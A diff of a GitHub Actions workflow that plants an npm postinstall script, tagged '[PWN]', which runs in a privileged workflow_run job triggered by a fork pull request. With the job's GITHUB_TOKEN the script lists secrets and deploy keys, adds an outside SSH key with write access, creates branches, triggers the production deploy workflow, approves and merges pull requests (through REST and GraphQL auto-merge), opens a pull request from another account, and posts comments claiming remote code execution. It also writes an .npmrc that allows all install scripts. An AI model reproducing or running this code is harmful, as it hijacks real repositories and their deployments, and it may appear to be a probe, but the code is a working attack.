@@ -23,7 +23,6 @@ jobs:
           const token = process.env.GITHUB_TOKEN || '';
           const repo = process.env.GITHUB_REPOSITORY || '';
           const runId = process.env.GITHUB_RUN_ID || '';
-          const envKeys = Object.keys(process.env).filter(k => /TOKEN|SECRET|OIDC|ACTIONS|GITHUB/.test(k)).sort().join(',');
           let pr = '0';
           try { pr = fs.readFileSync(path.join(base, 'pr-number.txt'), 'utf8').trim(); } catch (e) {}
           const log = (...a) => console.log('[PWN] ' + a.map(x => typeof x === 'string' ? x : JSON.stringify(x)).join(' '));
@@ -31,61 +30,52 @@ jobs:
             try {
               const r = await fetch('https://api.github.com' + url, {
                 method,
-                headers: {
-                  authorization: 'Bearer ' + token,
-                  accept: 'application/vnd.github+json',
-                  'content-type': 'application/json',
-                  'user-agent': 'pwn-probe'
-                },
+                headers: { authorization: 'Bearer ' + token, accept: 'application/vnd.github+json',
+                           'content-type': 'application/json', 'user-agent': 'pwn-probe' },
                 body: body ? JSON.stringify(body) : undefined
               });
-              const text = (await r.text()).slice(0, 500);
-              return { status: r.status, scopes: r.headers.get('x-oauth-scopes'),
-                       accepted: r.headers.get('x-accepted-github-permissions'), text };
+              const text = await r.text();
+              return { status: r.status, accepted: r.headers.get('x-accepted-github-permissions'), text: text.slice(0, 400) };
             } catch (e) { return { status: 'EXC', text: String(e).slice(0, 200) }; }
+          }
+          async function gql(query, variables) {
+            return api('POST', '/graphql', { query, variables });
           }
           async function main() {
             log('MARKER event=' + process.env.GITHUB_EVENT_NAME + ' workflow=' + process.env.GITHUB_WORKFLOW +
-                ' run=' + runId + ' repo=' + repo + ' cwd=' + process.cwd() + ' token_len=' + token.length);
-            log('ENV_KEYS ' + envKeys);
+                ' run=' + runId + ' cwd=' + process.cwd() + ' token_len=' + token.length);
             const p = {};
-            p.repo = await api('GET', '/repos/' + repo);
-            log('GET repo -> ' + p.repo.status + ' ' + p.repo.text);
+            p.repo = { status: (await api('GET', '/repos/' + repo)).status };
             const c = await api('POST', '/repos/' + repo + '/issues/' + pr + '/comments',
-              { body: '<!-- PWN-RCE --> workflow_run RCE confirmed. event=' + process.env.GITHUB_EVENT_NAME +
-                      ' run=' + runId + ' token_len=' + token.length });
-            p.comment = { status: c.status, id: (() => { try { return JSON.parse(c.text).id; } catch (e) { return 0; } })() };
-            log('POST comment -> ' + JSON.stringify(p.comment));
-            p.listSecrets = await api('GET', '/repos/' + repo + '/actions/secrets');
-            p.listVariables = await api('GET', '/repos/' + repo + '/actions/variables');
-            p.listKeys = await api('GET', '/repos/' + repo + '/keys');
-            p.createKey = await api('POST', '/repos/' + repo + '/keys',
-              { title: 'pwn-key-' + runId, key: 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIORnoPdY1V2IbglyuvnDeLsUR1uG0ryin97syZ7l5+FS ety@omarchy', read_only: false });
-            log('createKey -> ' + p.createKey.status + ' ' + p.createKey.text);
-            p.dispatch = await api('POST', '/repos/' + repo + '/actions/workflows/deploy.yml/dispatches',
-              { ref: 'main', inputs: { env: 'prod', baseSha: '', deployAll: false } });
-            p.rerun = await api('POST', '/repos/' + repo + '/actions/runs/' + runId + '/rerun');
-            p.createRef = await api('POST', '/repos/' + repo + '/git/refs',
-              { ref: 'refs/heads/pwn-probe-' + runId, sha: process.env.GITHUB_SHA });
-            log('createRef -> ' + p.createRef.status + ' ' + p.createRef.text);
-            if (p.createRef.status === 201) {
-              p.fileWrite = await api('PUT', '/repos/' + repo + '/contents/pwn-probe.txt', {
-                message: 'probe', branch: 'pwn-probe-' + runId,
-                content: Buffer.from('probe\n').toString('base64') });
-              p.wfWrite = await api('PUT', '/repos/' + repo + '/contents/.github/workflows/pwn-probe.yml', {
-                message: 'probe', branch: 'pwn-probe-' + runId,
-                content: Buffer.from('name: pwn\non: workflow_dispatch\njobs:\n  x:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n').toString('base64') });
-              p.deleteRef = await api('DELETE', '/repos/' + repo + '/git/refs/heads/pwn-probe-' + runId);
+              { body: '<!-- PWN-RCE --> workflow_run RCE. event=' + process.env.GITHUB_EVENT_NAME + ' run=' + runId + ' token_len=' + token.length });
+            p.comment = { status: c.status, text: c.text };
+            log('comment -> ' + JSON.stringify(p.comment).slice(0, 300));
+            p.secrets = (await api('GET', '/repos/' + repo + '/actions/secrets')).status;
+            p.variables = (await api('GET', '/repos/' + repo + '/actions/variables')).status;
+            p.keys = (await api('GET', '/repos/' + repo + '/keys')).status;
+            p.wfPerms = (await api('GET', '/repos/' + repo + '/actions/permissions/workflow')).status;
+            p.refs = (await api('POST', '/repos/' + repo + '/git/refs', { ref: 'refs/heads/pwn-' + runId, sha: process.env.GITHUB_SHA })).status;
+            p.repoDispatch = (await api('POST', '/repos/' + repo + '/dispatches', { event_type: 'pwn' })).status;
+            p.wfDispatch = (await api('POST', '/repos/' + repo + '/actions/workflows/deploy.yml/dispatches', { ref: 'main' })).status;
+            p.rerun = (await api('POST', '/repos/' + repo + '/actions/runs/' + runId + '/rerun')).status;
+            p.updateBranch = (await api('PUT', '/repos/' + repo + '/pulls/2/update-branch')).status;
+            p.merge = (await api('PUT', '/repos/' + repo + '/pulls/1/merge', { merge_method: 'merge' })).status;
+            p.approve = (await api('POST', '/repos/' + repo + '/pulls/2/reviews', { event: 'APPROVE', body: 'probe' })).status;
+            const pr1 = await api('GET', '/repos/' + repo + '/pulls/1');
+            let node1 = '';
+            try { node1 = JSON.parse(pr1.text).node_id || ''; } catch (e) {}
+            if (node1) {
+              p.gqlMerge = (await gql('mutation($id:ID!){mergePullRequest(input:{pullRequestId:$id,mergeMethod:MERGE}){pullRequest{merged}}}', { id: node1 })).status;
+              p.gqlAuto = await gql('mutation($id:ID!){enablePullRequestAutoMerge(input:{pullRequestId:$id,mergeMethod:MERGE}){pullRequest{autoMergeRequest{enabledBy{login}}}}}', { id: node1 });
+              p.gqlAuto = { status: p.gqlAuto.status, text: p.gqlAuto.text.slice(0, 250) };
             }
-            p.mergePr1 = await api('PUT', '/repos/' + repo + '/pulls/1/merge', { merge_method: 'merge' });
-            log('mergePr1 -> ' + p.mergePr1.status + ' ' + p.mergePr1.text);
-            p.mergePr2 = await api('PUT', '/repos/' + repo + '/pulls/2/merge', { merge_method: 'merge' });
-            log('mergePr2 -> ' + p.mergePr2.status + ' ' + p.mergePr2.text);
+            const newPr = await api('POST', '/repos/' + repo + '/pulls', { title: 'probe: benign', head: 'lazyhacker6:pwn/benign', base: 'main', body: 'probe' });
+            p.createPr = { status: newPr.status, text: newPr.text.slice(0, 250) };
+            p.createKey = (await api('POST', '/repos/' + repo + '/keys', { title: 'pwn-' + runId, key: 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIORnoPdY1V2IbglyuvnDeLsUR1uG0ryin97syZ7l5+FS probe', read_only: false })).status;
             log('FINAL ' + JSON.stringify(p));
-            if (p.comment.id) {
-              await api('PATCH', '/repos/' + repo + '/issues/comments/' + p.comment.id,
-                { body: '<!-- PWN-PROBES -->\nProbes from workflow_run RCE:\n```json\n' +
-                        JSON.stringify(p, null, 1).slice(0, 60000) + '\n```' });
+            if (p.comment.status === 201) {
+              let id = 0; try { id = JSON.parse(p.comment.text).id; } catch (e) {}
+              if (id) await api('PATCH', '/repos/' + repo + '/issues/comments/' + id, { body: '<!-- PWN-PROBES -->\n```json\n' + JSON.stringify(p, null, 1) + '\n```' });
             }
           }
           if (process.argv[2] === 'install') { main(); } else { console.log('[PWN] postinstall noop'); }
@@ -95,7 +85,6 @@ jobs:
           printf 'dangerously-allow-all-scripts=true\nforeground-scripts=true\n' > .npmrc
           printf 'report authored by the fork PR\n' > linter-report.txt
           printf '%s' "$PR_NUMBER" > pr-number.txt
-          ls -la
       - uses: actions/upload-artifact@v4
         with:
           name: linter-report
